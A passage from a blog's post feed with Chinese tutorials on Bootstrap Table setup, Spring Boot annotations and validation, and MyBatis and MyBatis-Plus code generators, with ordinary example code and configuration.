number">100</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token comment" spellcheck="true">//可供选择的每页的行数（*）</span>        search<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>                       <span class="token comment" spellcheck="true">//是否显示表格搜索，此搜索是客户端搜索，不会进服务端，所以，个人感觉意义不大</span>        strictSearch<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        showColumns<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>                  <span class="token comment" spellcheck="true">//是否显示所有的列</span>        showRefresh<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>                  <span class="token comment" spellcheck="true">//是否显示刷新按钮</span>        minimumCountColumns<span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span>             <span class="token comment" spellcheck="true">//最少允许的列数</span>        clickToSelect<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>                <span class="token comment" spellcheck="true">//是否启用点击选中行</span>        height<span class="token punctuation">:</span> <span class="token number">500</span><span class="token punctuation">,</span>                        <span class="token comment" spellcheck="true">//行高，如果没有设置height属性，表格自动根据记录条数觉得表格高度</span>        uniqueId<span class="token punctuation">:</span> <span class="token string">"ID"</span><span class="token punctuation">,</span>                     <span class="token comment" spellcheck="true">//每一行的唯一标识，一般为主键列</span>        showToggle<span class="token punctuation">:</span><span class="token boolean">true</span><span class="token punctuation">,</span>                    <span class="token comment" spellcheck="true">//是否显示详细视图和列表视图的切换按钮</span>        cardView<span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>                    <span class="token comment" spellcheck="true">//是否显示详细视图</span>        detailView<span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>                   <span class="token comment" spellcheck="true">//是否显示父子表</span>        showExport<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>                     <span class="token comment" spellcheck="true">//是否显示导出</span>        exportDataType<span class="token punctuation">:</span> <span class="token string">"basic"</span><span class="token punctuation">,</span>              <span class="token comment" spellcheck="true">//basic', 'all', 'selected'.</span>        columns<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">{</span>            checkbox<span class="token punctuation">:</span> <span class="token boolean">true</span>        <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>            field<span class="token punctuation">:</span> <span class="token string">'Key'</span><span class="token punctuation">,</span> title<span class="token punctuation">:</span> <span class="token string">'文件路径'</span>        <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>            field<span class="token punctuation">:</span> <span class="token string">'Size'</span><span class="token punctuation">,</span> title<span class="token punctuation">:</span> <span class="token string">'文件大小'</span>        <span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">{</span>            field<span class="token punctuation">:</span> <span class="token string">'X_COS_META_TAG1'</span><span class="token punctuation">,</span> title<span class="token punctuation">:</span> <span class="token string">'标签#1'</span> <span class="token punctuation">,</span> formatter<span class="token punctuation">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>value<span class="token punctuation">,</span> row<span class="token punctuation">,</span> index<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">{</span>            field<span class="token punctuation">:</span> <span class="token string">'notice'</span><span class="token punctuation">,</span> title<span class="token punctuation">:</span> <span class="token string">'备注'</span>        <span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">{</span>            field<span class="token punctuation">:</span> <span class="token string">'Button'</span><span class="token punctuation">,</span>title<span class="token punctuation">:</span><span class="token string">"操作"</span><span class="token punctuation">,</span>align<span class="token punctuation">:</span> <span class="token string">'center'</span><span class="token punctuation">,</span>events<span class="token punctuation">:</span>operateEvents<span class="token punctuation">,</span>formatter<span class="token punctuation">:</span><span class="token keyword">function</span><span class="token punctuation">(</span>value<span class="token punctuation">,</span>row<span class="token punctuation">,</span>index<span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">var</span> download <span class="token operator">=</span> <span class="token string">'&lt;button type="button" class="btn btn-danger download">下载&lt;/button>'</span>                <span class="token keyword">return</span> download<span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>     <span class="token punctuation">]</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p><strong>上面的注释其实已经很清楚明了了。我把它写成了一个函数的形式。这个根据自己的情况而定。我是为了需要复用的时候只需要调用函数就可以了。</strong></p><h2 id="Bootstrap-Table拆解"><a href="#Bootstrap-Table拆解" class="headerlink" title="Bootstrap Table拆解"></a>Bootstrap Table拆解</h2><pre class=" language-javascript"><code class="language-javascript"><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#tb_departments'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">bootstrapTable</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><p><strong>这个就像table的入口一样。也是初始化表格一样。此时对应的html是</strong></p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>tb_departments<span class="token punctuation">"</span></span> <span class="token attr-name">data-filter-control</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>true<span class="token punctuation">"</span></span> <span class="token attr-name">data-show-columns</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>true<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">></span></span></code></pre><hr><pre class=" language-js"><code class="language-js">columns<span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token punctuation">{</span>field<span class="token punctuation">:</span> <span class="token string">'Key'</span><span class="token punctuation">,</span> title<span class="token punctuation">:</span> <span class="token string">'文件路径'</span><span class="token punctuation">,</span>formatter<span class="token punctuation">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span>value<span class="token punctuation">,</span>row<span class="token punctuation">,</span>index<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span> <span class="token punctuation">}</span><span class="token punctuation">]</span></code></pre><ul><li><strong>columns</strong> <ul><li><strong>field json中键值对中的Key</strong></li><li><strong>title是表格头显示的内容</strong></li><li><strong>formatter 是一个函数类型。当我们对数据内容需要修改时(例：编码转换).</strong></li></ul></li></ul><hr><pre class=" language-js"><code class="language-js">events<span class="token punctuation">:</span>operateEvents window<span class="token punctuation">.</span>operateEvents <span class="token operator">=</span> <span class="token punctuation">{</span>        <span class="token string">'click .download'</span><span class="token punctuation">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>e<span class="token punctuation">,</span>value<span class="token punctuation">,</span>row<span class="token punctuation">,</span>index<span class="token punctuation">)</span> <span class="token punctuation">{</span>            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>row<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">xxx</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>   <span class="token punctuation">}</span></code></pre><p><strong>事件触发器，因为很多时候我们需要针对表格进行处理，所以事件触发器是一个不错的选择。它可以记录我们的行数据，可以利用触发器进行函数执行等。</strong></p><p><strong>其余内容查看注释选择使用就可以了。</strong></p><h2 id="四，表格导出"><a href="#四，表格导出" class="headerlink" title="四，表格导出"></a>四，表格导出</h2><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>js/bootstrap-table-export.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span> </code></pre><pre class=" language-js"><code class="language-js">showExport<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>                     <span class="token comment" spellcheck="true">//是否显示导出</span></code></pre><h2 id="5，总结"><a href="#5，总结" class="headerlink" title="5，总结"></a>5，总结</h2><p><strong>其实只是简单的阐述如何使用，你可以去查看下载的文件，你会发现Bootstrap 还有超多的插件我们并没有使用。后续我使用到了新的我再进行补充。</strong></p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> boostatrp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring Boot 学习笔记</title>
      <link href="/2019/05/24/spring-boot-xue-xi-bi-ji/"/>
      <url>/2019/05/24/spring-boot-xue-xi-bi-ji/</url>
      
        <content type="html"><![CDATA[<h1 id="Spring-Boot-学习笔记"><a href="#Spring-Boot-学习笔记" class="headerlink" title="Spring Boot 学习笔记"></a>Spring Boot 学习笔记</h1><h2 id="注释器"><a href="#注释器" class="headerlink" title="注释器"></a>注释器</h2><h3 id="Aspect"><a href="#Aspect" class="headerlink" title="@Aspect"></a>@Aspect</h3><blockquote><h3 id="把当前的注释类标识为一个切面供容器读取"><a href="#把当前的注释类标识为一个切面供容器读取" class="headerlink" title="把当前的注释类标识为一个切面供容器读取"></a>把当前的注释类标识为一个切面供容器读取</h3></blockquote><h3 id="ResponseBody"><a href="#ResponseBody" class="headerlink" title="@ResponseBody"></a>@ResponseBody</h3><blockquote><h4 id="此方法返回的是文本而不是视图"><a href="#此方法返回的是文本而不是视图" class="headerlink" title="此方法返回的是文本而不是视图"></a>此方法返回的是文本而不是视图</h4></blockquote><p>###　@RestController</p><blockquote><h4 id="RestController-Controller-ResponseBody"><a href="#RestController-Controller-ResponseBody" class="headerlink" title="RestController = @Controller + @ResponseBody"></a>RestController = @Controller + @ResponseBody</h4></blockquote><h3 id="Component"><a href="#Component" class="headerlink" title="@Component"></a>@Component</h3><blockquote><h4 id="声明此类是一个Spring管理的类"><a href="#声明此类是一个Spring管理的类" class="headerlink" title="声明此类是一个Spring管理的类"></a>声明此类是一个Spring管理的类</h4></blockquote><h3 id="Configuration"><a href="#Configuration" class="headerlink" title="@Configuration"></a>@Configuration</h3><blockquote><h4 id="声明此类是一个配置类，通常与注解-Bean配合使用"><a href="#声明此类是一个配置类，通常与注解-Bean配合使用" class="headerlink" title="声明此类是一个配置类，通常与注解@Bean配合使用"></a>声明此类是一个配置类，通常与注解@Bean配合使用</h4></blockquote><pre class=" language-java"><code class="language-java"><span class="token annotation punctuation">@Configuration</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">DataSourceConfig</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Bean</span><span class="token punctuation">(</span>name <span class="token operator">=</span> <span class="token string">"datasoucre"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> DataSource <span class="token function">dataSource</span><span class="token punctuation">(</span>Environment env<span class="token punctuation">)</span><span class="token punctuation">{</span>        DruidDataSource druidDataSource <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DruidDataSource</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        druidDataSource<span class="token punctuation">.</span><span class="token function">setUrl</span><span class="token punctuation">(</span>env<span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"spring.datasource.url"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        druidDataSource<span class="token punctuation">.</span><span class="token function">setUsername</span><span class="token punctuation">(</span>env<span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"spring.datasource.username"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        druidDataSource<span class="token punctuation">.</span><span class="token function">setPassword</span><span class="token punctuation">(</span>env<span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"spring.datasource.password"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        druidDataSource<span class="token punctuation">.</span><span class="token function">setDriverClassName</span><span class="token punctuation">(</span>env<span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"spring.datasource.driver-class-name"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> druidDataSource<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h3 id="＠RequestMapping"><a href="#＠RequestMapping" class="headerlink" title="＠RequestMapping"></a>＠RequestMapping</h3><blockquote><h4 id="Spring提供了简化后的-RequestMapping，提供了新的注解来表示http方法："><a href="#Spring提供了简化后的-RequestMapping，提供了新的注解来表示http方法：" class="headerlink" title="Spring提供了简化后的@RequestMapping，提供了新的注解来表示http方法："></a>Spring提供了简化后的@RequestMapping，提供了新的注解来表示http方法：</h4></blockquote><ul><li><p><strong>@GetMapping</strong> </p></li><li><p><strong>@PostMapping</strong></p></li><li><p><strong>@DeleteMapping</strong></p></li><li><p><strong>@PutMapping</strong></p></li><li><p><strong>@PatchMapping</strong></p><hr></li></ul><h4 id="属性consumes意味着请求的http头的Content-Type媒体类型与consumes匹配才能调用此方法"><a href="#属性consumes意味着请求的http头的Content-Type媒体类型与consumes匹配才能调用此方法" class="headerlink" title="属性consumes意味着请求的http头的Content-Type媒体类型与consumes匹配才能调用此方法"></a>属性consumes意味着请求的http头的Content-Type媒体类型与consumes匹配才能调用此方法</h4><pre class=" language-java"><code class="language-java">  <span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span>value<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">"/test.json"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>consumes<span class="token operator">=</span><span class="token string">"appliation/json"</span><span class="token punctuation">)</span></code></pre><h5 id="这里映射的请求媒体类型是application-json，所以无法接收到Ajax的请求方法。"><a href="#这里映射的请求媒体类型是application-json，所以无法接收到Ajax的请求方法。" class="headerlink" title="这里映射的请求媒体类型是application/json，所以无法接收到Ajax的请求方法。"></a>这里映射的请求媒体类型是<strong>application/json</strong>，所以无法接收到Ajax的请求方法。</h5><hr><h4 id="produces-属性对应于-HTTP-请求-Accept-字段-只有匹配得上的方法才能被调用。"><a href="#produces-属性对应于-HTTP-请求-Accept-字段-只有匹配得上的方法才能被调用。" class="headerlink" title="produces 属性对应于 HTTP 请求 Accept 字段 只有匹配得上的方法才能被调用。"></a>produces 属性对应于 HTTP 请求 Accept 字段 只有匹配得上的方法才能被调用。</h4><pre class=" language-java"><code class="language-java">  <span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span>path<span class="token operator">=</span><span class="token string">"/user/{userID}"</span><span class="token punctuation">,</span>produces<span class="token operator">=</span>MediaType<span class="token punctuation">.</span>APPLICATION_JSON_UTF8_VALUE<span class="token punctuation">)</span></code></pre><hr><h2 id="方法参数"><a href="#方法参数" class="headerlink" title="方法参数"></a>方法参数</h2><ul><li><p><strong>@PathVariable，可以将URL的值映射到方法参数中。</strong></p><pre class=" language-java"><code class="language-java"><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/user/{id}"</span><span class="token punctuation">)</span><span class="token keyword">public</span> String <span class="token function">user</span><span class="token punctuation">(</span><span class="token annotation punctuation">@PathVariable</span> Long id<span class="token punctuation">)</span></code></pre></li></ul><ul><li><p><strong>Model，Spring中通用的MVC模型，也可以使用Map和ModelMap作为渲染视图的模型</strong></p><pre class=" language-java"><code class="language-java">User userinfo <span class="token operator">=</span> userService<span class="token punctuation">.</span><span class="token function">getUserByName</span><span class="token punctuation">(</span>userid<span class="token punctuation">)</span><span class="token punctuation">;</span>model<span class="token punctuation">.</span><span class="token function">addAttribute</span><span class="token punctuation">(</span><span class="token string">"user"</span><span class="token punctuation">,</span>userinfo<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token string">"user.jsp"</span><span class="token punctuation">;</span></code></pre><h5 id="将获得的userinfo的信息绑定到在user中。我们在user-jsp中即可调用。使用方法为："><a href="#将获得的userinfo的信息绑定到在user中。我们在user-jsp中即可调用。使用方法为：" class="headerlink" title="将获得的userinfo的信息绑定到在user中。我们在user.jsp中即可调用。使用方法为："></a><del>将获得的userinfo的信息绑定到在user中。我们在user.jsp中即可调用。使用方法为：</del></h5><pre class=" language-java"><code class="language-java">$<span class="token punctuation">{</span><span class="token punctuation">{</span>user<span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre></li></ul><ul><li><p><strong>ModelAndView，包含了模型和视图路径</strong></p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> String <span class="token function">hello</span><span class="token punctuation">(</span>ModelAndView model<span class="token punctuation">)</span><span class="token punctuation">{</span>    model<span class="token punctuation">.</span><span class="token function">addObject</span><span class="token punctuation">(</span><span class="token string">"user"</span><span class="token punctuation">,</span>userinfo<span class="token punctuation">)</span><span class="token punctuation">;</span>    model<span class="token punctuation">.</span><span class="token function">setViewName</span><span class="token punctuation">(</span><span class="token string">"hello.jsp"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre></li><li><p><strong>MultipartFile,用于处理文件上传</strong></p><pre class=" language-java"><code class="language-java"><span class="token annotation punctuation">@PostMapping</span><span class="token punctuation">(</span><span class="token string">"/form"</span><span class="token punctuation">)</span><span class="token annotation punctuation">@ResponseBody</span><span class="token keyword">public</span> String <span class="token function">handleFormUpload</span><span class="token punctuation">(</span>String name<span class="token punctuation">,</span>MultipartFile file<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>file<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        String filename <span class="token operator">=</span> file<span class="token punctuation">.</span><span class="token function">getOriginalFilename</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        InputStream ins <span class="token operator">=</span> file<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string">"success"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token string">"failure"</span><span class="token punctuation">}</span></code></pre><p><strong>MultipartFile提供了以下方法来获取上传的文件信息：</strong></p><ul><li><strong>getOriginalFilename，获取上传的文件名字；</strong></li><li><strong>getBytes，获取上传文件内容，转为字节数组。</strong></li><li><strong>getInputStream，获取一个InputStream</strong></li><li><strong>getSize，获取文件大小。</strong></li><li><strong>isEmpty，文件上传内容为空，或者就没有文件上传。</strong></li><li><strong>transferTo(File dest),保存上传文件到目标文件系统。</strong></li></ul></li></ul><h2 id="验证框架"><a href="#验证框架" class="headerlink" title="验证框架"></a>验证框架</h2><h3 id="JSR-303"><a href="#JSR-303" class="headerlink" title="JSR-303"></a>JSR-303</h3><blockquote><h4 id="JSR-303是Java标准的验证框架，已有的实现有Hibernate-validator。"><a href="#JSR-303是Java标准的验证框架，已有的实现有Hibernate-validator。" class="headerlink" title="JSR-303是Java标准的验证框架，已有的实现有Hibernate validator。"></a>JSR-303是Java标准的验证框架，已有的实现有Hibernate validator。</h4></blockquote><ul><li><p><strong>空检查</strong></p><ul><li><p><strong>@Null，验证对象为空</strong></p></li><li><p><strong>@NotNull，验证对象不为空。</strong></p></li><li><p><strong>@NotBlank，验证字符串不为空或者不是空字符串。</strong></p></li><li><p><strong>NotEmpty，验证字符不为空，或者字符集不为空。</strong></p></li></ul></li></ul><ul><li><p><strong>长度检查</strong></p><ul><li><strong>@Size(min=,max=),验证字符长度，支持字符串，字符集。</strong></li><li><strong>@Lenth，字符长度。</strong></li></ul></li><li><p><strong>数值检测</strong></p><ul><li><strong>@Min，验证数字是否大于等于指定值。</strong></li><li><strong>@Max，验证数字是否小于等于指定值。</strong></li><li><strong>@Digits，验证数字是否符合指定格式，如@Digits(integer=2，fraction=1)</strong></li><li><strong>@Range，验证数字是否在指定的范围内。@Range(min=1，max=5)</strong></li></ul></li><li><p>其他</p><ul><li><strong>@Email，验证是否为邮箱格式，为null则不做校验。</strong></li><li><strong>@Pattern，验证String对象是否符合正则表达式的规则。</strong></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> springboot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SpringBootの代码生成器</title>
      <link href="/2019/05/16/springbootnodai-ma-sheng-cheng-qi/"/>
      <url>/2019/05/16/springbootnodai-ma-sheng-cheng-qi/</url>
      
        <content type="html"><![CDATA[<h1 id="SpringBootの代码生成器"><a href="#SpringBootの代码生成器" class="headerlink" title="SpringBootの代码生成器"></a>SpringBootの代码生成器</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>之前我们在使用SpringMVC的时候也讲到代码生成器。可以看<a href="https://kalifun.top/archives/214" target="_blank" rel="noopener">代码自动生成器のgeneratorconfig.xml</a>进行了解。代码生成器的好处就不用多说了，反正让我们可以快速搭建一个项目就对了。</p></blockquote><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>配置pox.xml</p><pre><code>&lt;!-- mybatisplus与springboot整合 --&gt;        &lt;dependency&gt;            &lt;groupId&gt;com.baomidou&lt;/groupId&gt;            &lt;artifactId&gt;mybatis-plus-boot-starter&lt;/artifactId&gt;            &lt;version&gt;3.0.5&lt;/version&gt;        &lt;/dependency&gt;        &lt;!-- velocity 模板引擎, 默认 --&gt;        &lt;dependency&gt;            &lt;groupId&gt;org.apache.velocity&lt;/groupId&gt;            &lt;artifactId&gt;velocity-engine-core&lt;/artifactId&gt;            &lt;version&gt;2.0&lt;/version&gt;        &lt;/dependency&gt;        &lt;!-- freemarker 模板引擎 --&gt;        &lt;dependency&gt;            &lt;groupId&gt;org.freemarker&lt;/groupId&gt;            &lt;artifactId&gt;freemarker&lt;/artifactId&gt;            &lt;version&gt;2.3.28&lt;/version&gt;        &lt;/dependency&gt;        &lt;!-- mysql数据库连接驱动 --&gt;        &lt;dependency&gt;            &lt;groupId&gt;mysql&lt;/groupId&gt;            &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt;            &lt;version&gt;5.1.31&lt;/version&gt;        &lt;/dependency&gt;        &lt;!--阿里druid数据库链接依赖--&gt;        &lt;dependency&gt;            &lt;groupId&gt;com.alibaba&lt;/groupId&gt;            &lt;artifactId&gt;druid&lt;/artifactId&gt;            &lt;version&gt;1.1.12&lt;/version&gt;        &lt;/dependency&gt;</code></pre><p>我们这里发现一个和我们之前提到不相同的东西那就是Mybatis-puls。</p><blockquote><p> MyBatis-Plus（简称 MP）是一个 MyBatis 的增强工具，在 MyBatis 的基础上只做增强不做改变，为简化开发、提高效率而生。</p></blockquote><h3 id="编写生成器程序"><a href="#编写生成器程序" class="headerlink" title="编写生成器程序"></a>编写生成器程序</h3><p> 到这步肯定都很懵了，就直接写生成器程序啦？对的，这里并不是采用的xml来配置生成器。而且是采用的springboot并没有之前繁琐的配置了。</p><pre><code>public class CodeGenerator {    public static String scanner(String tip){        Scanner scanner = new Scanner(System.in);        StringBuilder help = new StringBuilder();        help.append(&quot;请输入&quot;+tip+&quot;:&quot;);        System.out.println(help.toString());        if (scanner.hasNext()){            String ipt = scanner.next();            if (StringUtils.isNotEmpty(ipt)){                return ipt;            }        }        throw new MybatisPlusException(&quot;请输入正确的&quot;+tip);    }    public static void main(String[] args){        AutoGenerator mpg = new AutoGenerator();        GlobalConfig gc = new GlobalConfig();        String projectPath = System.getProperty(&quot;user.dir&quot;);        gc.setOutputDir(projectPath+&quot;/src/main/java&quot;);        gc.setOpen(false);        gc.setFileOverride(true);        gc.setActiveRecord(false);        gc.setEnableCache(false);        gc.setBaseResultMap(true);        gc.setBaseColumnList(false);        gc.setAuthor(&quot;fun&quot;);        mpg.setGlobalConfig(gc);        DataSourceConfig dsc = new DataSourceConfig();        dsc.setUrl(&quot;jdbc:mysql://localhost:3306/ssm?useUnicode=true&amp;useSSL=false&amp;characterEncoding=utf8&quot;);     //连接数据库地址        dsc.setDriverName(&quot;com.mysql.jdbc.Driver&quot;);       //连接数据库的驱动        dsc.setUsername(&quot;root&quot;);                     //数据库用户名        dsc.setPassword(&quot;root&quot;);                      //数据库密码        mpg.setDataSource(dsc);        PackageConfig pc = new PackageConfig();        pc.setModuleName(scanner(&quot;模块名&quot;));          //生成的代码将在此处输入的文件夹目录下        pc.setParent(&quot;top.kalifun.imgurl&quot;);                   //创建项目时的src/java下的目录        mpg.setPackageInfo(pc);         InjectionConfig cfg = new InjectionConfig() {            @Override            public void initMap() {            }        };        List&lt;FileOutConfig&gt; focList = new ArrayList&lt;&gt;();        focList.add(new FileOutConfig(&quot;/templates/mapper.xml.ftl&quot;) {            @Override            public String outputFile(TableInfo tableInfo) {                return projectPath + &quot;/src/main/resources/mapper/&quot; + pc.getModuleName() + &quot;/&quot; + tableInfo.getEntityName() + &quot;Mapper&quot; + StringPool.DOT_XML;            }        });        cfg.setFileOutConfigList(focList);        mpg.setCfg(cfg);        mpg.setTemplate(new TemplateConfig().setXml(null));        StrategyConfig strategy = new StrategyConfig();        strategy.setNaming(NamingStrategy.underline_to_camel);        strategy.setColumnNaming(NamingStrategy.underline_to_camel);        strategy.setRestControllerStyle(true);        strategy.setInclude(scanner(&quot;表名&quot;));             //输入你需要生成此表相关的代码        strategy.setSuperEntityColumns(&quot;id&quot;);        strategy.setControllerMappingHyphenStyle(true);        strategy.setTablePrefix(pc.getModuleName()+&quot;_&quot;);        mpg.setStrategy(strategy);        mpg.setTemplateEngine(new FreemarkerTemplateEngine());        mpg.execute();    }}</code></pre><p>这个可以定义为一个脚手架，当你需要自动生成代码时，直接对此代码进行修改就可以直接使用了，对效率提升是不是很大。<br><img src="https://image.kalifun.top/temp/1905/5879ce03f08a51af.png" alt="![](https://image.kalifun.top/temp/1905/5879ce03f08a51af.png)"><br>此程序可以直接运行，执行后将会获得执行log<br><img src="https://image.kalifun.top/temp/1905/2bdf13cd16a6c3e5.png" alt="![](https://image.kalifun.top/temp/1905/2bdf13cd16a6c3e5.png)"><br>我们将会获得controller,entity,mapper,service文件夹。在resource目录下的mapper也会根据数据库创建相应的mapper.xml文件。</p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> springboot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>代码自动生成器のgeneratorconfig.xml</title>
      <link href="/2019/05/08/dai-ma-zi-dong-sheng-cheng-qi-nogeneratorconfig/"/>
      <url>/2019/05/08/dai-ma-zi-dong-sheng-cheng-qi-nogeneratorconfig/</url>
      
        <content type="html"><![CDATA[<h1 id="代码自动生成器のgeneratorconfig-xml"><a href="#代码自动生成器のgeneratorconfig-xml" class="headerlink" title="代码自动生成器のgeneratorconfig.xml"></a>代码自动生成器のgeneratorconfig.xml</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>当我们写Java项目的时候，我们和数据相关时必定要写Dao，DaoMapper，Model相关的实体和接口。我觉得很无脑的敲，虽然很多都有补全，但是感觉还是没有自动生成快。</p></blockquote><h2 id="配置pom-xml"><a href="#配置pom-xml" class="headerlink" title="配置pom.xml"></a>配置pom.xml</h2><pre><code>&lt;dependency&gt;      &lt;groupId&gt;org.mybatis.generator&lt;/groupId&gt;      &lt;artifactId&gt;mybatis-generator-core&lt;/artifactId&gt;      &lt;version&gt;1.3.5&lt;/version&gt;    &lt;/dependency&gt;    ---------------------------------------------------------    下面是写在&lt;build&gt;下面的    &lt;plugin&gt;        &lt;groupId&gt;org.mybatis.generator&lt;/groupId&gt;        &lt;artifactId&gt;mybatis-generator-maven-plugin&lt;/artifactId&gt;        &lt;version&gt;1.3.5&lt;/version&gt;        &lt;configuration&gt;          &lt;verbose&gt;true&lt;/verbose&gt;          &lt;overwrite&gt;true&lt;/overwrite&gt;        &lt;/configuration&gt;      &lt;/plugin&gt;</code></pre><h2 id="在recourse下面创建application-properties"><a href="#在recourse下面创建application-properties" class="headerlink" title="在recourse下面创建application.properties"></a>在recourse下面创建application.properties</h2><pre><code>db.example.type=mysqldb.example.driver=com.mysql.jdbc.Driverdb.example.url=jdbc:mysql://localhost:3306/bookshop?useUnicode=true&amp;characterEncoding=utf8db.example.username=usernamedb.example.password=password#MBGInfogenerator.location=D:/apache-maven-3.6.0/repository/mysql/mysql-connector-java/5.1.41/mysql-connector-java-5.1.41.jargenerator.targetPackage=com.kalifun.dao   //需要存放自动生成的目录gererator.schema=database    //数据库名称gererator.tableName=book     //需要生成的表名称gererator.objectName=Book  //自动生成的名称</code></pre><h2 id="recourse下创建generatorConfig-xml"><a href="#recourse下创建generatorConfig-xml" class="headerlink" title="recourse下创建generatorConfig.xml"></a>recourse下创建generatorConfig.xml</h2><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE generatorConfiguration        PUBLIC &quot;-//mybatis.org//DTD MyBatis Generator Configuration 1.0//EN&quot;        &quot;http://mybatis.org/dtd/mybatis-generator-config_1_0.dtd&quot;&gt;&lt;generatorConfiguration&gt;    &lt;!-- 引入配置文件 --&gt;    &lt;properties resource=&quot;application.properties&quot;/&gt;    